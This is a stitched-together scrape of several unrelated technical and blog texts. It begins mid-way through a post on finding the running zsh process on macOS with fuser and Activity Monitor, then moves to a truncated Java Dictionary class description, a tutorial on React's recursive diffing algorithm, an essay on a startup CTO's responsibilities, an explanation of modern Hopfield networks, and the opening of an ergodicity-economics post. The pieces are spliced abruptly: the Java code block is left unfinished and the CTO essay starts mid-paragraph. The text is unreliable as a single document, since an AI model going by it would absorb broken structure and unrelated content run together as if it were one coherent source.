<span>...</span> <span>trimmed</span> <span>output</span> <span>...</span>
</pre></div>


<p>Ahhh, finally! Not a single of instance of <code>/bin/zsh</code> in the output. I think
I'm pretty happy with this result.</p>
<h2>Are There Other Ways?</h2>
<p>But now I'm even more curious. Are there other ways to find this same
information? Turns out <code>apropos process</code> returned a few results but of the
bunch the only interesting find was <code>fuser</code>. </p>
<h2>fuser</h2>
<div><pre><span></span><span>~ % fuser /usr/local/Cellar/zsh/5.7.1/bin/zsh             </span>
<span>/usr/local/Cellar/zsh/5.7.1/bin/zsh: 78525</span>
</pre></div>


<p>Neat. That PID matches <code>$$</code>.</p>
<div><pre><span></span><span>~ % fuser /bin/zsh</span>
<span>/bin/zsh: </span>
</pre></div>


<p>And no results for the pre-installed macOS version of <code>/bin/zsh</code>. </p>
<h2>macOS Activity Monitor</h2>
<p>If you want a more point-and-click way of finding the same information then
Activity Monitor has you covered. Make sure View &gt; Applications in last 12
hours is selected. Expand Terminal.app and double click zsh. Clicking the
Sample button on the bottom left gives you some detailed information about that
running process. </p>
<p><img alt="Screen shot showing layered windows of macOS Activity Monitor and a process sample output of zsh" src="https://nil.wallyjones.com/images/activity-monitor-zsh.png"></p>
<p>Fun fact: you can use the <code>sample</code> command for the same information.</p>
<h2>Conclusion</h2>
<p>Finding the shell you're <em>actually</em> using isn't all that simple at first. You
can find the location of the executable of the shell. You can find all
the processes currently running with that shell name. But gathering information
about the shell you're typing all those commands in to find the shell you're
using requires a little more poking around. The two easiest solutions, on macOS
at least, are <code>lsof</code> and <code>fuser</code>. Activity Monitor also offers up a GUI for
finding the same information but you need to how to dig into it.</p>

<h2>Java Dictionary Class</h2>
<p>Java.util package provides a Dictionary class which is the abstract parent of any class, such as Hashtable, which maps keys to values. Every key and every value is an object. In any one Dictionary object, every key is associated with at most one value. Given a Dictionary and a key, the associated element can be looked up. Any non-null object can be used as a key and as a value.</p>


<h3>Class declaration</h3>
<p>The declaration of java.util.Dictionary class is:</p>
<div>
    
<pre>public abstract class Dictionary&lt;K,V&gt;

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><em>The <a target="_blank" href="https://blog.burhanuday.tech/react-internals-part-1-the-basic-concepts-and-the-prerequisites">previous article</a> in the series is a prerequisite to understanding this one. It introduces you to terms and concepts that will be used extensively in this article. I will also link to further reading resources, React docs and sources for writing this article. I will try to keep jargon on the minimum and provide with meanings of terms wherever possible</em></p>
<h2 id="review">Review</h2>
<p>Please read the first article if you haven't already.</p>
<ol>
<li><p><strong>Reconciliation</strong></p>
<p>The diffing algorithm that React uses to determine which parts of the tree have changed</p>
</li>
<li><p><strong>DOM</strong></p>
<p>The DOM or Document Object Model is a tree data structure that is used 
by the browser. It is a representation of the UI in the form of a tree data structure.</p>
</li>
</ol>
<h2 id="the-recursive-nature-of-the-diffing-algorithm">The Recursive Nature Of The Diffing Algorithm</h2>
<p>At any time, you can think of the <code>render()</code> function with a return value of a tree of React elements</p>
<pre><code><span>var</span> elementTree = render(a);
</code></pre>
<p>For example. Take a look at this component:</p>
<pre><code>class HashSign extends React.Component {
    render() {
        return &lt;span&gt;#&lt;/span&gt;
    }
}

class HashTag extends React.Component {
    render() {
        return (
            &lt;div className="row"&gt;
                &lt;HashSign/&gt;
                &lt;b&gt;React&lt;/b&gt;
            &lt;/div&gt;
        )
    }
}
</code></pre>
<p>When React starts rendering the UI, first <code>HashTag</code> component's render function is called. Then a recursive call to the render functions of <code>HashSign</code> and the <code>b</code> tag is done. This results in the following tree of elements (Lists of elements are stored as Linked Lists):</p>
<pre><code>{
    type: <span>"div"</span>,
    className: <span>"row"</span>,
    props: {
        children: [
            {
                type: <span>"span"</span>,
                children: <span>"#"</span>
            },
            {
                type: <span>"b"</span>,
                children: <span>"React"</span>
            }
        ]
    }
}
</code></pre>
<p>When the props or state changes, React needs to update the Real DOM. On the next update, the <code>render()</code> function generates a different tree of React elements.</p>
<p>Now, React needs to figure out what has changed and find the minimum number of changes to transform the old tree into the new one.</p>
<p>A naive implementation of this diff would have a complexity in order of O(n3) but React implements a heuristic O(n) algorithm based on two assumptions:</p>
<ol>
<li><p>Two elements having different <code>type</code> props will product different trees. React will not attempt to diff the two trees and will rather replace the old tree completely</p>
</li>
<li><p><code>key</code> props given components are stable, predictable and unique. React uses these keys to diff lists (hence the key related warnings in the console when rendering a list)</p>
</li>
</ol>
<p><em>A <strong>heuristic</strong> technique or a heuristic is any approach to problem solving or self-discovery that employs a practical method that is not guaranteed to be optimal, perfect, or rational, but is nevertheless sufficient for reaching an immediate, short-term goal or approximation. - Wikipedia</em></p>
<p><em>Note: I have explained the <code>type</code> prop for elements in the previous article</em></p>
<h2 id="the-diffing-algorithm-itself">The Diffing Algorithm Itself</h2>
<p>When React starts diffing the two trees, it starts comparing the trees from the root element. There can be a few possibilities:</p>
<h3 id="1-elements-have-different-types">1. Elements have different types</h3>
<p>If the <code>type</code> property of the root elements don't match, React will tear down the old subtree and build the new one from scratch. When the old subtree gets destroyed, the old DOM nodes have to be removed from the DOM. When building the new subtree, new elements are inserted into the DOM. Any state associated with the old subtree is lost.</p>
<p>Any elements associated with the root will also get unmounted and also have their state destroyed. For example</p>
<pre><code><span>&lt;<span>div</span>&gt;</span>
    <span>&lt;<span>p</span>&gt;</span>Hello World!<span>&lt;/<span>p</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>

<span>&lt;<span>span</span>&gt;</span>
    <span>&lt;<span>p</span>&gt;</span>Hello World!<span>&lt;/<span>p</span>&gt;</span>
<span>&lt;/<span>span</span>&gt;</span>
</code></pre>
<p>This will destroy the old instance of the <code>p</code> tag and create a new one</p>
<h3 id="2-elements-have-same-type">2. Elements have same type</h3>
<p>When comparing two React DOM elements that have the same type, React looks at the attributes of the element and only updates the changed attributes. For example</p>
<pre><code><span>&lt;<span>div</span> <span>className</span>=<span>"before"</span> <span>title</span>=<span>"stuff"</span> /&gt;</span>

<span>&lt;<span>div</span> <span>className</span>=<span>"after"</span> <span>title</span>=<span>"stuff"</span> /&gt;</span>
</code></pre>
<p>React will only modify the className on the underlying DOM node</p>
<h3 id="3-elements-in-lists">3. Elements in lists</h3>
<p>React iterates over elements in both lists simultaneously and makes changes wherever necessary. This approach works when an element is added to the end of the list. For example:</p>
<pre><code><span>&lt;<span>ul</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>first<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>second<span>&lt;/<span>li</span>&gt;</span>
<span>&lt;/<span>ul</span>&gt;</span>

<span>&lt;<span>ul</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>first<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>second<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>third<span>&lt;/<span>li</span>&gt;</span>
<span>&lt;/<span>ul</span>&gt;</span>
</code></pre>
<p>Here, React first compares the first elements in both the lists. Sees that there are no changes and moves on to the second element. It then compares the second element in both the lists and sees that there are no changes to be made. Then it sees that an element is inserted in the new list, and makes the required change.</p>
<p>This approach can result in poor performance if an element is inserted at the start of the list. For example:</p>
<pre><code><span>&lt;<span>ul</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>Mumbai<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>Banglore<span>&lt;/<span>li</span>&gt;</span>
<span>&lt;/<span>ul</span>&gt;</span>

<span>&lt;<span>ul</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>Hyderabad<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>Mumbai<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span>&gt;</span>Banglore<span>&lt;/<span>li</span>&gt;</span>
<span>&lt;/<span>ul</span>&gt;</span>
</code></pre>
<p>React first compares <code>Mumbai</code> and <code>Hyderabad</code> and since the inner text has changed, it destroys the old list and creates a new list from scratch.</p>
<p>This is where the <code>key</code> prop becomes the saviour.</p>
<pre><code><span>&lt;<span>ul</span>&gt;</span>
  <span>&lt;<span>li</span> <span>key</span>=<span>"2018"</span>&gt;</span>Mumbai<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span> <span>key</span>=<span>"2019"</span>&gt;</span>Banglore<span>&lt;/<span>li</span>&gt;</span>
<span>&lt;/<span>ul</span>&gt;</span>

<span>&lt;<span>ul</span>&gt;</span>
  <span>&lt;<span>li</span> <span>key</span>=<span>"2017"</span>&gt;</span>Hyderabad<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span> <span>key</span>=<span>"2018"</span>&gt;</span>Mumbai<span>&lt;/<span>li</span>&gt;</span>
  <span>&lt;<span>li</span> <span>key</span>=<span>"2019"</span>&gt;</span>Banglore<span>&lt;/<span>li</span>&gt;</span>
<span>&lt;/<span>ul</span>&gt;</span>
</code></pre>
<p>When elements have keys, React uses the keys to match elements in the old tree with the new one. It understands that <code>Hyderabad</code> has been inserted into the list and the other two elements have just been moved.</p>

<p>Also, check out this great article by <a target="_blank" href="https://reactarmory.com/guides/learn-react-by-itself/rendering-and-rerendering">React Armory</a></p>
<h2 id="the-problem-with-this-approach">The Problem With This Approach</h2>
<p>The above algorithm is purely recursive. Any update results in the subtree being rerendered immediately when <code>setState</code> is called. This approach has a limitation:</p>
<h3 id="not-all-updates-are-equal">Not all updates are equal</h3>
<p>An update to the user interface should be given more priority than say, a data store change. Otherwise, the UI might feel slow to use.</p>
<p>Most apps will have a rather large element tree and an update of one of the higher elements in the tree will cause the entire subtree to rerender. If this subtree is large, then it might cause a drop in the frame rate.</p>
<p>Most computers now have a refresh rate higher than 60Hz which means that the screen refreshes at least 60 times every second. This gives React <code>1/60 = 16.67ms</code>. In this limited amount of time, React has to diff the two subtrees and apply the changes in the Real DOM (which is a slow task). Also, the browser has to do other work as well at the same time. If this time budget is exhausted, there will be a drop in the frames and the screen will feel jittery.</p>
<p>To fix this, the React team rewrote the reconciliation algorithm from scratch and found an intuitive way of updating the elements. The new algorithm is called Fiber and has been in use since React 16. I will cover Fiber in the next article in the series.</p>
<h2 id="wrapping-up">Wrapping Up</h2>
<p>We saw how the reconciliation algorithm in use until React 15 renders elements recursively. We also saw the limitations of the algorithm.</p>
<p>In the next article in this series, I will cover the Fiber reconciliation engine. Fiber was first introduced in React 16. I will also cover how it enables the incremental rendering of the virtual DOM.</p>

As all industries start to embrace technology as part of the core business, the person incharge of this technology will then start to grow in its important. Do you then know what does the role of a CTO entails? Beyond the glamorous term comes with a ton of responsibilities that is paramount for the development of the company across its stages. If you ever inspires to be a CTO yourself someday, this article is for you.</p>

<h2>What does CTO do across stages of a startup</h2>
<br>
<h3>1. Pre-seed stage</h3>

<p>Here you have 0 - 1 developer to basically kick start your entire idea. From git repo initilisation to actually be able to see a UI. Here is where your pre-seed stage will be.</p>
<br>
<ul>
<li>Building the MVP</li>
</ul>

<p>Startup CTOs should be well versed in the tools and technologies available for building MVPs, whether those be web apps, mobile apps, desktop software. They cannot be afraid to get their hands dirty because even if there is a budget to hire a team, the CTO plays backup for any roles that cannot be immediately filled.</p>

<p>You need to create this MVP that can be able to gain real-time user feedback as fast as possible.</p>
<br>
<h3>2. Early startup</h3>

<p>You actually have some intermittent market feedback of a market fit and now you are looking to ramp up your development work. Here, you will look to have 1 - 10 engineers to kick start your development process. I’ve come to believe that different companies sits in this stage for various durations. The size of the engineering team should only appropriately grow in proportion with the performance and traction of the product or service. You do not want to find yourself to be in a situation where you are mass-hiring but each engineers are actually relatively unproductive. You should only ramp up the size of the engineering when you have processes in place to better manage these additional manpower. Truly, many cooks spoil the broth. Listed below are some of the scope of a CTO in the early start phase:</p>
<br>
<ul>
<li>Hiring engineers, IT professionals, and data scientists.</li>
</ul>

<p>Finding and bringing on engineering talent is one of the hardest things for tech startups to do. Hiring for cultural fit at a small startup is challenging. Many developers want to specialize while startups demand generalists.</p>

<p>CTO at a startup has to be good at hiring, onboarding, training, and eventually replacing the company’s technical staffs. Having a proven hiring process and strong network will help.</p>
<br>
<ul>
<li>Figuring out company-wide security</li>
</ul>

<p>When no security policy was done before, it falls onto the lap of CTOs to own the security component, run audits, document security procedures, and train everyone on the basis of it.</p>

<p>Simple security includes a VPN to protect your servers &amp; database from public access.</p>
<br>
<ul>
<li>Product management</li>
</ul>

<p>While the CTOs primary goal is to make the vision of the non-technical product manager a reality, it also means that they have to manage the flow of work into the engineering team. Often times, CTOs take an active role in laying out the product planning process. It is common for startup CTOs to learn both product and technology. Its challenging but learning new things is the norm at startups.</p>
<br>
<ul>
<li>Clear technical debts<br>
A good startup CTO will recognize when poor architecture is slowing down the team, and will step in to settle these technical debts when needed. Eventually these architecture clean ups may be delegated to senior engineers, but it will be likely to fall onto the CTO once in a while.</li>
</ul>
<br>
<ul>
<li>Bug triage</li>
</ul>

<p>First without a Quality Assurance team, it falls onto the CTO to triage bugs, replicate and document down the behavior of the feature, then distribute these bugs to the team for a fix. Deciding how to debug an issue requires detailed understanding of the implementation.</p>
<br>
<ul>
<li>QA and testing</li>
</ul>

<p>Without a proper initial team of quality assurance engineers, the testing layer falls onto the responsibility of the engineering team, headed by the CTO. Planning out the testing layers requires hands-on, hands dirty experiments.</p>
<p>Attached is an article on how to create your testing layer in your company. Check it out <a ref="nofollow" target="_blank" href="https://www.karllhughes.com/posts/testing-layers">here</a>.</p>
<br>
<ul>
<li>DevOps</li>
</ul>

<p>Your servers are your digital assets, and until a DevOps engineer is hired to manage these assets, it will too fall onto the CTO to manage them during the interim period.</p>
<br>
<h3>3. Growth</h3>

<p>Here the company has been gaining traction and is now looking to grow the team from 10 - 100 engineers. The company’s product is starting to mature and people are looking to settle into your company as a possible career-long alternative. In here, then you have to focus on ensuring employee retention and a healthy career progression for each of your employees.</p>
<br>
<ul>
<li>Vendor and customer relationship</li>
</ul>

<p>The CTO has to be clear to figure out what is needed to be done to streamline the company’s technical cost. It could be for the developers processes, or the company’s process through technology.<br>
This is essential if the product is starting to integrate with other softwares or has its own API. The external technical relationships will be the responsibility of the CTO. This is essential if we have power users whom are integrating with us, requesting for some ‘must-have’ features.</p>
<br>
<ul>
<li>Team growth management</li>
</ul>

<p>Managing a team of 5 is different from managing a team of 100. Once the company expands and grow, you will start to hire more specialised engineers which isn’t looking for exciting and challenging tasks. Their focus will just be the traditional benefits, vacation days, and a structured career ladder. The ability to develop the skillset to manage the startup across different life stages will also be the challenge the CTO has to undergo.</p>
<br>
<ul>
<li>Employee retention</li>
</ul>

<p>The early employees whom joined for the challenges may consider other options as the startup phases into a mid-sized startup. As tech workers has plenty of options, its rare to keep one for more than 2, 3 years. The CTO that moves the company across phases has to learn how to retain their employees with strong alignment to the worker’s personal goals.</p>
<br>
<h3>4. Expansion</h3>

<p>Generally, once you are in the phase of expansion, you have to be laser focused to get your technology vision and mission in your company. This does not imply that your company has to utilize the latest technology all the time. Fundamentally, what is your company’s vision and problem statement? Focus on that, and ensure that we are using the best technology available out there to achieve this goal.</p>

<p><img src="https://www.dropbox.com/s/q9pg24tufqwzoog/expansion.png?raw=1" alt=""></p>
<br>
<hr>
<br>
<h2>Challenges</h2>

<p>The challenges a CTO face will be endless. Even as a developer, the amount of challenges you face are endless and everyday you have a ton of todos and blockers to clear. More specifically for CTOs, just as I was reading up on the this aspect, the key challenges faced by all CTOs are primarily hiring and alignment with business people.</p>
<br>
<h3>1. Hiring</h3>

<p>Good engineers that can help you to marry business and technology are hard to find. It will be all the more in demand in times when the world is embracing digital transformation. Even investors are willing to put their millions into savings plans through video calls. It is key to hire not just gifted engineers but those whom will also help shape the culture of the business.</p>
<br>
<h3>2. Focusing on customer engagement</h3>

<p>If you want to create a good technology, it is only just as good as whom the technology is created for. You may create the world’s first robotic arm for minimally invasive surgery but if i’m only washing dishes, why would that be of value to me? You have to benchmark the quality of your product to the utility of your target audience. They have the valuable feedback. In a world where there is a imperfect information, one can only move in the most informed decision; but always with a certain level of uncertainty and risk. Continuously engage with your ‘customers’ and find out what will empower them and set them up to do more with less using your product.</p>
<br>
<hr>
<br>
<h2>5 Key learning opportunities</h2>

<p>Not everyone is born ready for such a big role. It will stretch you, ‘forces’ you to rise up to the occasion and you may even be surprised by what you are able to achieve when you’re placed under the pressurized cooker of your business demands. Generally, CTO is a leadership role. As glamorous as it may sound, it is still in essence just a role. What is most important is the being that is placed in that role. Are you developing yourself to face the bigger problems that are before you?</p>
<br>
<ol>
<li>
<p>Technical knowledge</p>
</li>
<li>
<p>Technical leadership and strategy planning</p>
</li>
<li>
<p>Communication and Mentoring</p>
</li>
<li>
<p>Project management and Operational excellence</p>
</li>
<li>
<p>Sense of entrepreneurship and anticipation of the future</p>
</li>
</ol>

<p>What better way to find out your key areas of learning opportunities than to hear from founders themselves. Here’s a video that To sum this part up</p>

<br>
<h2>TLDR;</h2>

<p>The end goal, the article gives a in-depth glimpse into the scope of a CTO’s day to day. How then can one possibly keep up with this pace of work? Only if you have a clear vision of the possible future. Technology is no longer just a tool for your Business-as-usual. It could possibly shape your future and redesign how life could be, should be, and will be.</p>

<p>From here on, I wish to share with you all a really cool podcast called <a ref="nofollow" target="_blank" href="https://moderncto.io/">Modern CTO</a>. It is a podcast whom CTOs of all different companies will share some of their thoughts, journey, and learnings as CTOs. One thing is common: their level of curiosity for the world around them. Whatever role you are to play, stay curious and be a future explorer!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">
      <p>This blog post explains the paper <a href="https://arxiv.org/abs/2008.02217">Hopfield Networks is All You Need</a> and the corresponding new PyTorch <a href="https://github.com/ml-jku/hopfield-layers">Hopfield layer</a>.</p>

<h2 id="main-contributions">Main contributions</h2>
<p>We introduce a new energy function and a corresponding new update rule which is guaranteed to converge to a local minimum of the energy function.</p>

<p>The new energy function is a generalization (discrete states \(\Rightarrow\) continuous states) of <strong>modern Hopfield Networks</strong> aka <strong>Dense Associative Memories</strong> introduced by <a href="https://arxiv.org/abs/1606.01164">Krotov and Hopfield</a> and <a href="https://arxiv.org/abs/1702.01929">Demircigil et al.</a>
The new modern Hopfield Network with continuous states keeps the characteristics of its discrete counterparts:</p>
<ul>
  <li>exponential storage capacity</li>
  <li>extremely fast convergence</li>
</ul>

<p>Surprisingly, the new update rule is the attention mechanism of transformer networks introduced in <a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a>.
We use these new insights to analyze transformer models in the paper.</p>

<h2 id="what-this-blog-post-is-about">What this blog post is about</h2>

<p>This blog post is split into three parts. First, we make the transition from traditional Hopfield Networks towards <strong>modern Hopfield Networks</strong> and their generalization to continuous states through our <strong>new energy function</strong>. Second, the properties of our new energy function and the connection to the self-attention mechanism of transformer networks is shown. Finally, we introduce and explain a new PyTorch layer (<a href="https://github.com/ml-jku/hopfield-layers">Hopfield layer</a>), which is built on the insights of our work. We show several practical use cases, i.e. <a href="https://arxiv.org/abs/2007.13505">Modern Hopfield Networks and Attention for Immune Repertoire Classification</a>, Hopfield pooling, and associations of two sets.</p>

<h2 id="from-classical-hopfield-networks-to-self-attention">From classical Hopfield Networks to self-attention</h2>

<p><strong>Associative memories</strong> are one of the earliest artificial neural models dating back to the 1960s and 1970s. Best known are <a href="https://authors.library.caltech.edu/7427/1/HOPpnas82.pdf">Hopfield Networks</a>, presented by John Hopfield in 1982.
As the name suggests, the main purpose of associative memory networks is to associate an input with its most similar pattern. In other words, the purpose is to store and retrieve patterns.
We start with a review of classical Hopfield Networks.</p>

<h3 id="hopfield-networks">Hopfield Networks</h3>

<p>The simplest associative memory is just a <strong>sum of outer products</strong> of the \(N\) patterns \(\{\boldsymbol{x}_i\}_{i=1}^N\) that we want to store (Hebbian learning rule). In classical Hopfield Networks these patterns are polar (binary), i.e. \(\boldsymbol{x}_i \in \{ -1,1 \}^d\), where \(d\) is the length of the patterns. The corresponding weight matrix \(\boldsymbol{W}\) is:</p>

\[\begin{equation}
\boldsymbol{W} = \sum_i^N \boldsymbol{x}_i \boldsymbol{x}_i^T \ . \tag{1}
\end{equation}\]

<p>The weight matrix \(\boldsymbol{W}\) stores the patterns, which can be retrieved starting with a <strong>state pattern</strong> \(\boldsymbol{\xi}\).</p>

<hr>
<p><strong>Nomenclature</strong></p>

<p>From now on we denote the \(N\) <strong>stored patterns</strong> as \(\{\boldsymbol{x}_i\}_{i=1}^N\) and any <strong>state pattern</strong> or <strong>state</strong> as \(\boldsymbol{\xi}\).</p>

<hr>

<p>The basic <strong>synchronuous update rule</strong> is to repeatedly multiply the state pattern \(\boldsymbol{\xi}\) with the weight matrix \(\boldsymbol{W}\), subtract the bias and take the sign:</p>

\[\begin{equation}
\boldsymbol{\xi^{t+1}} =  \text{sgn}(\boldsymbol{W}\boldsymbol{\xi}^t - \boldsymbol{b}) \ , \tag{2}
\label{eq:restorage}
\end{equation}\]

<p>where \(\boldsymbol{b} \in \mathbb{R}^d\) is a bias vector, which can be interpreted as threshold for every component.
The <strong>asynchronous update rule</strong> performs this update only for one component of \(\boldsymbol{\xi}\) and then selects the next component for update.
Convergence is reached if \(\boldsymbol{\xi^{t+1}} = \boldsymbol{\xi^{t}}\).</p>

<p>The asynchronous version of the update rule of Eq. \eqref{eq:restorage} minimizes the <strong>energy function</strong> \(\text{E}\):</p>

\[\begin{equation}
\text{E} = -\frac{1}{2}\boldsymbol{\xi}^T \boldsymbol{W} \boldsymbol{\xi} + \boldsymbol{\xi}^T\boldsymbol{b} = -\frac{1}{2} \sum_{i=1}^d\sum_{j=1}^d w_{ij}\xi_i\xi_j + \sum_{i=1}^d b_i\xi_i \ . \tag{3}
\label{eq:energy_hopfield}
\end{equation}\]

<p>As derived in the papers of <a href="https://ieeexplore.ieee.org/stamp/stamp.jsp?tp=&amp;arnumber=58341">Bruck</a>, <a href="https://www.sciencedirect.com/science/article/pii/0166218X85900290">Goles-Chacc et al.</a> and <a href="https://authors.library.caltech.edu/7427/1/HOPpnas82.pdf">the original Hopfield paper</a>, the convergence properties are dependent on the structure of the weight matrix \(\boldsymbol{W}\) and the method by which the nodes are updated:</p>

<ul>
  <li>For asynchronous updates with \(w_{ii} \geq 0\) and \(w_{ij} = w_{ji}\), the updates converge to a stable state.</li>
  <li>For synchronous updates with \(w_{ij} = w_{ji}\), the updates converge to a stable state or a limit cycle of length 2.</li>
</ul>

<p>For the asynchronous update rule and symmetric weights, \(\text{E}(\boldsymbol{\xi}^{t+1}) \leq \text{E}(\boldsymbol{\xi}^{t})\) holds. When \(\text{E}(\boldsymbol{\xi}^{t+1}) = \text{E}(\boldsymbol{\xi}^{t})\) for the update of every component of \(\boldsymbol{\xi}^t\), a local minimum in \(\text{E}\) is reached.
All stored patterns \(\{\boldsymbol{x}_i\}_{i=1}^N\) should be fixed points of the Hopfield Network, i.e.</p>

\[\begin{equation}
\boldsymbol{x}_i = \text{sgn}(\boldsymbol{W}\boldsymbol{x}_i - \boldsymbol{b}) \ . \tag{4}
\end{equation}\]

<p>They should even be local minima of \(\text{E}\).</p>

<p>In the following example, no bias vector is used. This means that taking the inverse image, i.e. flipping all pixels at once, results in the same energy.</p>

<p>We start with an <strong>illustrative example</strong> of a Hopfield Network. <strong>One input image</strong> should first be stored and then be retrieved.
The input image is:</p>

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/single_pat_img/homer_original.png" alt="not found" width="300px"></p>

<p>Since an associative memory has <strong>polar states and patterns</strong> (or binary states and patterns), we convert the input image to a black and white image:</p>

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/single_pat_img/homer_bw.png" alt="not found" width="300px"></p>

<p>The <strong>weight matrix</strong> \(\boldsymbol{W}\) is the outer product of this black and white image \(\boldsymbol{x}_{\text{Homer}}\):</p>

\[\begin{equation}
\boldsymbol{W} = \boldsymbol{x}_{\text{Homer}} \boldsymbol{x}_{\text{Homer}}^T \ , \qquad \boldsymbol{x}_{\text{Homer}} \in \{ -1,1\}^d \ , \tag{5}
\label{eq:weight_matrix}
\end{equation}\]

<p>where for this example \(d = 64 \times 64\).</p>

<p>Can the original image be restored if half of the pixels are masked out? The masked image is:</p>

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/single_pat_img/homer_bw_masked.png" alt="not found" width="300px"></p>

<p>which is our inital state \(\boldsymbol{\xi}\). This inital state is updated via multiplication with the weight matrix \(\boldsymbol{W}\).
It takes one update until the original image is restored.</p>

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/single_pat_img/homer_bw_masked_retrieved.png" alt="not found" width="600px"></p>

<p>What happens if we store <strong>more than one pattern</strong>? The weight matrix is then built from the sum of outer products of <strong>three stored patterns</strong> (three input images):</p>

\[\begin{equation}
\boldsymbol{W} = \sum_{i=1}^3 \boldsymbol{x}_i \boldsymbol{x}_i^T \ , \qquad \boldsymbol{x}_i \in \{ -1,1\}^d \ . \tag{6}
\end{equation}\]

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/multi_pat_img/experiment_6.png" alt="not found"></p>

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/multi_pat_img/experiment_12.png" alt="not found"></p>

<p>In this figure, the left hand side shows the three stored patterns, and the right hand side shows masked state patterns \(\boldsymbol{\xi}\) together with the retrieved patterns \(\boldsymbol{\xi}^{\text{new}}\).</p>

<p>Looking at the upper row of images might suggest that the retrieval process is no longer perfect. But there are two interesting facts to take into account:</p>
<ul>
  <li>Masking the original images introduces many pixel values of \(-1\). We therefore have the odd behavior that the inner product \(\langle\boldsymbol{x}_{\text{Homer}}^{\text{masked}},\boldsymbol{x}_{\text{Bart}}\rangle\) is larger than the inner product \(\langle\boldsymbol{x}_{\text{Homer}}^{\text{masked}},\boldsymbol{x}_{\text{Homer}}\rangle\).</li>
  <li>As stated above, if no bias vector is used, the inverse of the pattern, i.e. flipping all pixels at once, results in the same energy.</li>
</ul>

<p>Although the retrieval of the upper image looks incorrect, it is de facto correct. However, for the lower row example, the retrieval is no longer correct.
The weights of \(2 \cdot \boldsymbol{x}_{\text{Marge}}\) have simply overwritten the weights of \(\boldsymbol{x}_{\text{Homer}}\).
For both examples, only the retrieval after the first update step is shown, but the results do not change when performing further update steps.
The next figure shows the Hopfield Network retrieval for 6 patterns.</p>

<p><img src="https://ml-jku.github.io/hopfield-layers/assets/multi_pat_img/experiment_115.png" alt="not found"></p>

<p>Clearly, retrieving the patterns is imperfect. One might suspect that the limited storage capacities of Hopfield Networks, see <a href="https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.322.3548&amp;rep=rep1&amp;type=pdf">Amit et al.</a> and <a href="https://journals.aps.org/pre/pdf/10.1103/PhysRevE.66.061910">Torres et al</a>, is the problem.
However, we show now that the storage capacity is not directly responsible for the imperfect retrieval.
The storage capacity for <strong>retrieval of patterns free of errors</strong> is:</p>

\[\begin{equation}
C \cong \frac{d}{2\log(d)} \ , \tag{7}
\label{eq:storage_hopfield}
\end{equation}\]

<p>where \(d\) is the dimension of the input.</p>

<p>The storage capacity for <strong>retrieval of patterns with a small percentage of errors</strong> is:</p>

\[\begin{equation}
C \cong 0.14 d\ . \tag{8}
\label{eq:storage_hopfield2}
\end{equation}\]

<p>In the example, the storage capacity is \(C \cong 0.14 d = 0.14 \cdot 64 \cdot 64 \sim 570\).
Thus, insufficient storage capacity is not directly responsible for the retrieval errors.
Instead, the example patterns are correlated, therefore the retrieval has errors.</p>

<p>Consequently, we need a model which <strong>allows pulling apart close patterns</strong>, such that (strongly) <strong>correlated patterns can be distinguished</strong>.</p>

<hr>
<p><strong>On storage capacity</strong></p>

<p>The storage capacities stated in Eq. \eqref{eq:storage_hopfield} and in Eq. \eqref{eq:storage_hopfield2} are derived for \(w_{ii}=0\).
Recently, <a href="https://www.frontiersin.org/articles/10.3389/fncom.2016.00144/full">Folli et al.</a> analyzed the storage capacity for Hopfield Networks with \(w_{ii}\geq 0\). Also for \(w_{ii}\geq 0\), a storage capacity of \(C \cong 0.14 d\)
for retrieval of patterns with a small percentage of errors was observed. The ratio \(C/d\) is often called <strong>load parameter</strong> and denoted by \(\alpha\). <a href="https://www.frontiersin.org/articles/10.3389/fncom.2016.00144/full">Folli et al.</a> showed that there is a second regime with very large \(\alpha\), where the storage capacity is much higher, i.e. more fixed points exist. However, <a href="https://arxiv.org/abs/1704.07741">Rocci et al.</a> and <a href="https://www.mdpi.com/1099-4300/21/8/726/htm">Gosti et al.</a> reported that these fixed points for very large \(\alpha\) are unstable and do not have an attraction basin.</p>

<hr>

		<p>In my previous posts on loss aversion (<a href="https://jasoncollins.blog/2019/09/10/kahneman-and-tverskys-debatable-loss-aversion-assumption/">here</a>, <a href="https://jasoncollins.blog/2019/11/06/what-can-we-infer-about-someone-who-rejects-a-5050-bet-to-win-110-or-lose-100-the-rabin-paradox-explored/">here</a> and <a href="https://jasoncollins.blog/2019/12/05/the-case-against-loss-aversion/">here</a>), I foreshadowed a post on how “ergodicity economics” might shed some light on whether we need loss aversion to explain people’s choices under uncertainty. This was to be that post, but the background material that I drafted is long enough to be a stand alone piece. I’ll turn to the application of ergodicity economics to loss aversion in a future post.</p>
<p>The below is largely drawn from presentations and papers by <a href="https://ergodicityeconomics.com/">Ole Peters</a> and <a href="http://lml.org.uk/research/economics/">friends</a>, with my own evolutionary take at the end. For a deeper dive, see the <a href="https://ergodicityeconomics.com/lecture-notes/">lecture notes by Peters and Alexander Adamou</a>, or a recent <a href="https://doi.org/10.1038/s41567-019-0732-0">Perspective by Peters in Nature Physics</a>.</p>
<p><strong>The choice</strong></p>
<p>Suppose you have $100 and are offered a gamble involving a series of coin flips. For each flip, heads will increase your wealth by 50%. Tails will decrease it by 40%. Flip 100 times.</p>
<p><strong>The expected payoff</strong></p>
